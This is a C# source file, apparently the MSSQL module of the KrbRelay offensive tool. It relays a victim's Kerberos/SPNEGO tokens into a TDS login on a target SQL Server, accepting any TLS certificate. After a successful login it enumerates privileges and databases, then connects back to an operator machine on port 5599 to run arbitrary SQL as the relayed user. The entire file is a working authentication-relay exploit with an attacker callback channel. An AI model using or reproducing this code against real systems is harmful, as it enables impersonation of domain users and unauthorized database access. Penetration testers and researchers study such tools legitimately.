using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Text;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    // Pure C# Kerberos-relay-to-MSSQL client. Runs on the relay host and
    // connects directly to the target MSSQL server over TDS (1433).
    //
    // Mirrors impacket's tds.py classic (non-TDS8) TLS-in-TDS flow:
    //  1) plaintext PRELOGIN
    //  2) TLS handshake tunneled inside TDS_PRE_LOGIN (0x12) packets
    //  3) LOGIN7 (0x10) with SSPI = victim's raw GSS AP-REQ, sent over the now-open TLS channel
    //  4) server replies with a TDS_SSPI (0x11) packet: 0xED + raw SSPI token -> hand to victim (apRep1)
    //  5) victim's next token (apRep2) is relayed back to the server as the next TDS_SSPI packet
    //  6) server replies LOGINACK (success) or error
    public static class Mssql
    {
        private static TcpClient tcp;
        private static NetworkStream rawStream;
        private static PreloginStream pls;
        private static SslStream ssl;
        private static byte packetIdCounter = 1;
        private static byte serverEncryption = 0x00;
        // "login stream" = where LOGIN7 goes (ssl); "post-login stream" = where TDS_SSPI and later go.
        // If server picks ENCRYPT_OFF (0x00), only LOGIN7 is encrypted; everything after is cleartext.
        private static Stream postLoginStream;

        public static int targetPort = 1433;

        public static void Connect()
        {
            try
            {
                if (apRep1.Length == 0)
                {
                    ConnectAndLogin();
                }
                else
                {
                    SendFinalLeg();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Mssql.Connect error: {0}", e);
            }
        }

        private static void ConnectAndLogin()
        {
            string host = string.IsNullOrEmpty(targetFQDN) ? (Environment.GetEnvironmentVariable("KRBRELAY_TARGET") ?? "mssql.target.local") : targetFQDN;
            Console.WriteLine("[*] MSSQL: connecting to {0}:{1}", host, targetPort);

            tcp = new TcpClient();
            tcp.Connect(host, targetPort);
            rawStream = tcp.GetStream();

            // 1) plaintext PRELOGIN
            byte[] preloginPayload = BuildPreloginPayload();
            SendRawTds(rawStream, 0x12, 0x01, 0, preloginPayload);
            byte[] preloginResp = ReadFullTds(rawStream);
            serverEncryption = ParsePreloginEncryption(preloginResp);
            Console.WriteLine("[*] PRELOGIN response Encryption byte = 0x{0:x2}", serverEncryption);

            if (serverEncryption == 0x02) // TDS_ENCRYPT_NOT_SUP
            {
                Console.WriteLine("[-] Server does not support encryption, cannot continue (need confidentiality for the login)");
                Environment.Exit(0);
            }

            // 2) TLS handshake tunneled inside TDS_PRE_LOGIN packets
            pls = new PreloginStream(rawStream) { Handshaking = true };
            ssl = new SslStream(pls, false, (sender, cert, chain, errors) => true);
            ssl.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);
            pls.Handshaking = false;
            Console.WriteLine("[+] TLS established inside TDS (cipher: {0})", ssl.CipherAlgorithm);

            // 3) LOGIN7 with SSPI = victim's full SPNEGO NegTokenInit, forwarded verbatim.
            // Victim is Negotiate SSP (svc=0x09), so `ticket` is already a complete SPNEGO blob
            // with the mechList the victim will compute MIC over.
            Console.WriteLine("[*] forwarding victim's SPNEGO NegTokenInit verbatim ({0} bytes) in LOGIN7", ticket.Length);
            byte[] login7 = BuildLogin7(ticket, host);
            SendRawTds(ssl, 0x10, 0x01, packetIdCounter++, login7);

            // Per MS-TDS 2.2.6.5: ENCRYPT_OFF (0x00) means ONLY the LOGIN7 packet is encrypted.
            // Everything after — server's response AND subsequent TDS_SSPI — is cleartext.
            postLoginStream = (serverEncryption == 0x00) ? (Stream)rawStream : (Stream)ssl;
            Console.WriteLine("[*] post-login stream = {0}", serverEncryption == 0x00 ? "rawStream (cleartext)" : "ssl (encrypted)");

            // 4) server reply: expect TDS_SSPI (payload[0] == 0xED) containing the raw AP-REP
            byte[] resp = ReadFullTds(postLoginStream);
            if (resp.Length == 0)
            {
                Console.WriteLine("[-] empty response to LOGIN7");
                Environment.Exit(0);
            }
            Console.WriteLine("[*] LOGIN7 response, first bytes: {0}", Helpers.ByteArrayToString(resp.Take(Math.Min(40, resp.Length)).ToArray()));

            if (resp[0] == 0xED)
            {
                // TDS_SSPI_TOKEN: ED + LEN(2-byte LE) + SSPIBuffer (= SPNEGO NegTokenResp from MSSQL)
                int sspiLen = resp[1] | (resp[2] << 8);
                byte[] spnegoResp = resp.Skip(3).Take(sspiLen).ToArray();
                Console.WriteLine("[*] server SPNEGO NegTokenResp ({0} bytes), first: {1}", spnegoResp.Length,
                    Helpers.ByteArrayToString(spnegoResp.Take(Math.Min(20, spnegoResp.Length)).ToArray()));
                // Store the ENTIRE NegTokenResp as apRep1 — hook will hand this to the victim's
                // Negotiate SSP, which will compute the mechListMIC using its session key.
                apRep1 = spnegoResp;
                Console.WriteLine("[+] got server SPNEGO NegTokenResp, handing to victim (Negotiate SSP) for leg 2 with MIC");
            }
            else if (IsLoginAck(resp))
            {
                Console.WriteLine("[+] LOGIN SUCCEEDED on first leg (no further SSPI round needed)");
                RunQueriesAndShell(host);
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[-] unexpected LOGIN7 response, dumping and exiting");
                DumpStrings(resp);
                Environment.Exit(0);
            }
        }

        private static void SendFinalLeg()
        {
            string host = string.IsNullOrEmpty(targetFQDN) ? (Environment.GetEnvironmentVariable("KRBRELAY_TARGET") ?? "mssql.target.local") : targetFQDN;
            Console.WriteLine("[*] MSSQL: sending victim's final SSPI token ({0} bytes)", ticket.Length);

            Stream s = postLoginStream ?? (Stream)ssl;
            SendRawTds(s, 0x11, 0x01, packetIdCounter++, ticket);
            byte[] resp = ReadFullTds(s);
            Console.WriteLine("[*] final response, first bytes: {0}", Helpers.ByteArrayToString(resp.Take(Math.Min(60, resp.Length)).ToArray()));

            if (IsLoginAck(resp))
            {
                Console.WriteLine("[+] LOGIN SUCCESS as relayed user!");
                RunQueriesAndShell(host);
            }
            else
            {
                Console.WriteLine("[-] LOGIN failed, dumping response text:");
                DumpStrings(resp);
            }
            Environment.Exit(0);
        }

        private static bool IsLoginAck(byte[] data)
        {
            // Walk the TDS token stream. Success starts with 0xE3 ENVCHANGE (database set)
            // and contains 0xAD LOGINACK. Failure typically starts with 0xAA ERROR_TOKEN.
            if (data.Length == 0) return false;
            if (data[0] == 0xAA) return false;                  // explicit error token up front
            if (data[0] == 0xAD) return true;                   // direct LOGINACK
            // Response begins with ENVCHANGE/INFO on a successful login — LOGINACK is further in.
            // Step token-by-token, honoring each token's own length class so we can't desync
            // into payload bytes and fabricate a 0xAD/0xAA match.
            int i = 0;
            while (i < data.Length)
            {
                byte tok = data[i];
                if (tok == 0xAD) return true;                   // LOGINACK -> success
                if (tok == 0xAA) return false;                  // ERROR token -> fail

                switch (tok)
                {
                    // USHORT-length tokens we expect before LOGINACK in a login reply:
                    // ENVCHANGE(0xE3), INFO(0xAB), FEATUREEXTACK(0xAE), ERROR(0xAA, handled above).
                    case 0xE3:
                    case 0xAB:
                    case 0xAE:
                        if (i + 3 > data.Length) return false;
                        int len = data[i + 1] | (data[i + 2] << 8);
                        i += 3 + len;
                        break;
                    // DONE family: fixed 8-byte body, no length prefix. Reached only if LOGINACK
                    // was absent -> not a successful login.
                    case 0xFD:
                    case 0xFE:
                    case 0xFF:
                        return false;
                    default:
                        // Unknown/unexpected token before any LOGINACK: cannot step safely,
                        // so stop rather than risk a false positive.
                        return false;
                }
            }
            return false;
        }

        private static void DumpStrings(byte[] data)
        {
            // crude UTF-16LE printable-run extractor, good enough to read error/info text
            var sb = new StringBuilder();
            for (int i = 0; i + 1 < data.Length; i += 2)
            {
                char c = (char)(data[i] | (data[i + 1] << 8));
                if (c >= 0x20 && c < 0x7f)
                    sb.Append(c);
                else if (sb.Length > 0 && sb[sb.Length - 1] != '\n')
                    sb.Append(' ');
            }
            Console.WriteLine(sb.ToString());
        }

        // ============== minimal interactive shell back to operator ==============
        private static void RunQueriesAndShell(string host)
        {
            string[] idQueries = new[]
            {
                "SELECT SYSTEM_USER AS me, IS_SRVROLEMEMBER('sysadmin') AS sysadmin, DB_NAME() AS db",
                "SELECT name FROM sys.databases"
            };
            foreach (var q in idQueries)
            {
                Console.WriteLine(">>> {0}", q);
                RunQuery(q);
            }

            // Drive further ad-hoc queries over a plain TCP connection back to the operator,
            // line-delimited: read a query, run it, write back the extracted strings.
            string kaliIp = Environment.GetEnvironmentVariable("KRBRELAY_SHELL_IP") ?? "127.0.0.1";
            int kaliPort = 5599;
            try
            {
                Console.WriteLine("[*] opening SQL shell channel to {0}:{1}", kaliIp, kaliPort);
                using (var shellTcp = new TcpClient())
                {
                    shellTcp.Connect(kaliIp, kaliPort);
                    using (var ns = shellTcp.GetStream())
                    using (var reader = new StreamReader(ns, Encoding.UTF8))
                    using (var writer = new StreamWriter(ns, new UTF8Encoding(false)) { AutoFlush = true })
                    {
                        writer.WriteLine("[+] MSSQL relay shell ready as relayed user, target " + host);
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            if (line.Trim().ToLower() == "exit") break;
                            if (line.Trim().Length == 0) continue;
                            try
                            {
                                string outp = RunQueryCapture(line);
                                writer.WriteLine(outp);
                                writer.WriteLine("--END--");
                            }
                            catch (Exception e)
                            {
                                writer.WriteLine("[!] query error: " + e);
                                writer.WriteLine("--END--");
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] shell channel failed (continuing without it): {0}", e.Message);
            }
        }

        private static void RunQuery(string query)
        {
            Console.WriteLine(RunQueryCapture(query));
        }

        private static string RunQueryCapture(string query)
        {
            byte[] qbytes = Encoding.Unicode.GetBytes(query);
            Stream s = postLoginStream ?? (Stream)ssl;
            SendRawTds(s, 0x01, 0x01, packetIdCounter++, qbytes); // TDS_SQL_BATCH = 0x01
            byte[] resp = ReadFullTds(s);
            var sb = new StringBuilder();
            sb.AppendLine(string.Format("[{0} bytes]", resp.Length));
            // crude UTF-16LE string extraction (works well enough for error text and most row text data)
            var cur = new StringBuilder();
            for (int i = 0; i + 1 < resp.Length; i += 2)
            {
                char c = (char)(resp[i] | (resp[i + 1] << 8));
                if (c >= 0x20 && c < 0x7f)
                {
                    cur.Append(c);
                }
                else
                {
                    if (cur.Length >= 2) { sb.AppendLine(cur.ToString()); }
                    cur.Clear();
                }
            }
            if (cur.Length >= 2) sb.AppendLine(cur.ToString());
            sb.AppendLine("[raw hex] " + Helpers.ByteArrayToString(resp));
            return sb.ToString();
        }

        // ============== TDS packet framing ==============

        private static byte[] BuildTdsHeader(byte type, byte status, byte packetId, int dataLen)
        {
            var hdr = new byte[8];
            hdr[0] = type;
            hdr[1] = status;
            int len = 8 + dataLen;
            hdr[2] = (byte)((len >> 8) & 0xFF);
            hdr[3] = (byte)(len & 0xFF);
            hdr[4] = 0; hdr[5] = 0; // SPID
            hdr[6] = packetId;
            hdr[7] = 0; // window
            return hdr;
        }

        private static void SendRawTds(Stream s, byte type, byte status, byte packetId, byte[] data)
        {
            var hdr = BuildTdsHeader(type, status, packetId, data.Length);
            var full = new byte[hdr.Length + data.Length];
            Buffer.BlockCopy(hdr, 0, full, 0, 8);
            Buffer.BlockCopy(data, 0, full, 8, data.Length);
            s.Write(full, 0, full.Length);
            s.Flush();
        }

        private static void ReadExact(Stream s, byte[] buf, int offset, int count)
        {
            int got = 0;
            while (got < count)
            {
                int n = s.Read(buf, offset + got, count - got);
                if (n <= 0) throw new IOException("connection closed while reading " + count + " bytes");
                got += n;
            }
        }

        private static (byte type, byte status, byte[] data) ReadOneTdsPacket(Stream s)
        {
            var hdr = new byte[8];
            ReadExact(s, hdr, 0, 8);
            int len = (hdr[2] << 8) | hdr[3];
            int dataLen = len - 8;
            var data = new byte[Math.Max(0, dataLen)];
            if (dataLen > 0) ReadExact(s, data, 0, dataLen);
            return (hdr[0], hdr[1], data);
        }

        // reassembles a possibly multi-packet TDS message (loops until Status has EOM bit set)
        public static byte[] ReadFullTds(Stream s)
        {
            var all = new List<byte>();
            while (true)
            {
                var pkt = ReadOneTdsPacket(s);
                all.AddRange(pkt.data);
                if ((pkt.status & 0x01) != 0) break;
            }
            return all.ToArray();
        }


        // ============== PRELOGIN ==============

        private static byte[] BuildPreloginPayload()
        {
            byte[] version = new byte[] { 0x08, 0x00, 0x01, 0x55, 0x00, 0x00 };
            byte[] instance = Encoding.ASCII.GetBytes("MSSQLServer\0");
            byte[] threadId = new byte[] { 0x00, 0x00, 0x00, 0x00 };
            byte encryption = 0x00; // TDS_ENCRYPT_OFF -- we offer, server decides

            int headerLen = (1 + 2 + 2) * 4 + 1; // 4 tokens + terminator
            int versionOffset = headerLen;
            int encryptionOffset = versionOffset + version.Length;
            int instanceOffset = encryptionOffset + 1;
            int threadIdOffset = instanceOffset + instance.Length;

            using (var ms = new MemoryStream())
            {
                void WriteToken(byte token, int offset, int length)
                {
                    ms.WriteByte(token);
                    ms.WriteByte((byte)((offset >> 8) & 0xFF));
                    ms.WriteByte((byte)(offset & 0xFF));
                    ms.WriteByte((byte)((length >> 8) & 0xFF));
                    ms.WriteByte((byte)(length & 0xFF));
                }
                WriteToken(0x00, versionOffset, version.Length);
                WriteToken(0x01, encryptionOffset, 1);
                WriteToken(0x02, instanceOffset, instance.Length);
                WriteToken(0x03, threadIdOffset, threadId.Length);
                ms.WriteByte(0xff);
                ms.Write(version, 0, version.Length);
                ms.WriteByte(encryption);
                ms.Write(instance, 0, instance.Length);
                ms.Write(threadId, 0, threadId.Length);
                return ms.ToArray();
            }
        }

        private static byte ParsePreloginEncryption(byte[] resp)
        {
            int p = 0;
            while (p < resp.Length && resp[p] != 0xff)
            {
                byte token = resp[p];
                int offset = (resp[p + 1] << 8) | resp[p + 2];
                int length = (resp[p + 3] << 8) | resp[p + 4];
                if (token == 0x01) return resp[offset];
                p += 5;
            }
            throw new Exception("no encryption token found in PRELOGIN response");
        }

        // ============== LOGIN7 ==============

        private static byte[] BuildLogin7(byte[] sspi, string serverName)
        {
            string hostName = Environment.GetEnvironmentVariable("COMPUTERNAME") ?? "WORKSTATION";
            string appName = "OSQL-32";
            string cltIntName = appName;

            byte[] hostNameB = Encoding.Unicode.GetBytes(hostName);
            byte[] userNameB = new byte[0];
            byte[] passwordB = new byte[0];
            byte[] appNameB = Encoding.Unicode.GetBytes(appName);
            byte[] serverNameB = Encoding.Unicode.GetBytes(serverName);
            byte[] cltIntNameB = Encoding.Unicode.GetBytes(cltIntName);
            byte[] languageB = new byte[0];
            byte[] databaseB = new byte[0];
            byte[] atchDbFileB = new byte[0];
            byte[] changePasswordB = new byte[0];

            const int FIXED_LEN = 94;
            int index = FIXED_LEN;

            int hostNameOffset = index; index += hostNameB.Length;
            int userNameOffset = userNameB.Length > 0 ? index : 0; index += userNameB.Length;
            int passwordOffset = passwordB.Length > 0 ? index : 0; index += passwordB.Length;
            int appNameOffset = index; index += appNameB.Length;
            int serverNameOffset = index; index += serverNameB.Length;
            // not using TDS 7.4 feature-ext layout -> no extension block
            int extensionOffset = 0;
            int cltIntNameOffset = index; index += cltIntNameB.Length;
            int languageOffset = index; index += languageB.Length;
            int databaseOffset = index; index += databaseB.Length;
            int sspiOffset = index; index += sspi.Length;
            int atchDbFileOffset = index; index += atchDbFileB.Length;
            int changePasswordOffset = index; index += changePasswordB.Length;

            int totalLen = index;

            var data = new byte[FIXED_LEN];
            void W32LE(int off, uint v) { data[off] = (byte)v; data[off + 1] = (byte)(v >> 8); data[off + 2] = (byte)(v >> 16); data[off + 3] = (byte)(v >> 24); }
            void W32BE(int off, uint v) { data[off] = (byte)(v >> 24); data[off + 1] = (byte)(v >> 16); data[off + 2] = (byte)(v >> 8); data[off + 3] = (byte)v; }
            void W16LE(int off, int v) { data[off] = (byte)v; data[off + 1] = (byte)(v >> 8); }

            W32LE(0, (uint)totalLen);              // Length
            W32BE(4, 0x00000071);                  // TDSVersion = TDS_LOGIN7_VERSION_71 (big-endian)
            W32LE(8, 4096);                         // PacketSize
            W32BE(12, 7);                           // ClientProgVer (big-endian)
            W32LE(16, (uint)new Random().Next(1, 1024)); // ClientPID
            W32LE(20, 0);                           // ConnectionID
            data[24] = 0xE0;                        // OptionFlags1
            data[25] = 0x01 | 0x02 | 0x80;          // OptionFlags2 = INIT_LANG_FATAL | ODBC_ON | INTEGRATED_SECURITY_ON
            data[26] = 0x00;                        // TypeFlags
            data[27] = 0x00;                        // OptionFlags3
            W32LE(28, 0);                           // ClientTimeZone
            W32LE(32, 0);                           // ClientLCID

            W16LE(36, hostNameOffset); W16LE(38, hostNameB.Length / 2);
            W16LE(40, userNameOffset); W16LE(42, userNameB.Length / 2);
            W16LE(44, passwordOffset); W16LE(46, passwordB.Length / 2);
            W16LE(48, appNameOffset); W16LE(50, appNameB.Length / 2);
            W16LE(52, serverNameOffset); W16LE(54, serverNameB.Length / 2);
            W16LE(56, extensionOffset); W16LE(58, 0); // ExtensionOffset/Length
            W16LE(60, cltIntNameOffset); W16LE(62, cltIntNameB.Length / 2);
            W16LE(64, languageOffset); W16LE(66, languageB.Length / 2);
            W16LE(68, databaseOffset); W16LE(70, databaseB.Length / 2);
            data[72] = 0x01; data[73] = 0x02; data[74] = 0x03; data[75] = 0x04; data[76] = 0x05; data[77] = 0x06; // ClientID
            W16LE(78, sspiOffset); W16LE(80, Math.Min(sspi.Length, 0xFFFF));
            W16LE(82, atchDbFileOffset); W16LE(84, atchDbFileB.Length / 2);
            W16LE(86, changePasswordOffset); W16LE(88, changePasswordB.Length / 2);
            W32LE(90, 0); // SSPILongLength

            using (var ms = new MemoryStream())
            {
                ms.Write(data, 0, data.Length);
                ms.Write(hostNameB, 0, hostNameB.Length);
                ms.Write(userNameB, 0, userNameB.Length);
                ms.Write(passwordB, 0, passwordB.Length);
                ms.Write(appNameB, 0, appNameB.Length);
                ms.Write(serverNameB, 0, serverNameB.Length);
                ms.Write(cltIntNameB, 0, cltIntNameB.Length);
                ms.Write(languageB, 0, languageB.Length);
                ms.Write(databaseB, 0, databaseB.Length);
                ms.Write(sspi, 0, sspi.Length);
                ms.Write(atchDbFileB, 0, atchDbFileB.Length);
                ms.Write(changePasswordB, 0, changePasswordB.Length);
                return ms.ToArray();
            }
        }

        // ============== TLS-in-TDS duplex wrapper for the handshake ==============
        private class PreloginStream : Stream
        {
            private readonly NetworkStream inner;
            public bool Handshaking = true;
            private readonly Queue<byte> pending = new Queue<byte>();

            public PreloginStream(NetworkStream inner) { this.inner = inner; }

            public override bool CanRead => true;
            public override bool CanWrite => true;
            public override bool CanSeek => false;
            public override long Length => throw new NotSupportedException();
            public override long Position { get => throw new NotSupportedException(); set => throw new NotSupportedException(); }
            public override void Flush() { inner.Flush(); }
            public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
            public override void SetLength(long value) => throw new NotSupportedException();

            public override int Read(byte[] buffer, int offset, int count)
            {
                if (!Handshaking)
                    return inner.Read(buffer, offset, count);

                if (pending.Count == 0)
                {
                    byte[] data = ReadFullTds(inner);
                    if (data.Length == 0) return 0;
                    foreach (byte b in data) pending.Enqueue(b);
                }
                int n = Math.Min(count, pending.Count);
                for (int i = 0; i < n; i++) buffer[offset + i] = pending.Dequeue();
                return n;
            }

            public override void Write(byte[] buffer, int offset, int count)
            {
                var slice = new byte[count];
                Buffer.BlockCopy(buffer, offset, slice, 0, count);
                if (Handshaking)
                {
                    var hdr = BuildTdsHeader(0x12, 0x01, 0, slice.Length);
                    var full = new byte[hdr.Length + slice.Length];
                    Buffer.BlockCopy(hdr, 0, full, 0, 8);
                    Buffer.BlockCopy(slice, 0, full, 8, slice.Length);
                    inner.Write(full, 0, full.Length);
                }
                else
                {
                    inner.Write(slice, 0, slice.Length);
                }
            }
        }
    }
}
